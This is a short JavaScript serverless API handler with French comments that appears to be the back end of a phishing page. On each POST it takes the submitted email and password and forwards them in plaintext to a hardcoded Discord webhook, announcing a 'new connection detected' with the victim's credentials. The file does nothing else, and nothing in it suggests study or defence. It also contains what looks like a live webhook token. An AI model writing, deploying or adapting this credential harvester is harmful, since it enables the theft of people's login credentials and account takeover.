export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { email, password } = req.body; // On récupère les deux ici
    const webhookUrl = "https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER";

    // Message en français avec les deux infos
    const message = {
      content: `📥 **Nouvelle connexion détectée** :\n👤 **Utilisateur :** \`${email}\`\n🔑 **Mot de passe :** \`${password}\``
    };

    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message),
    });

    return res.status(200).json({ status: 'Envoyé' });
  } else {
    res.status(405).json({ message: 'Méthode non autorisée' });
  }
}
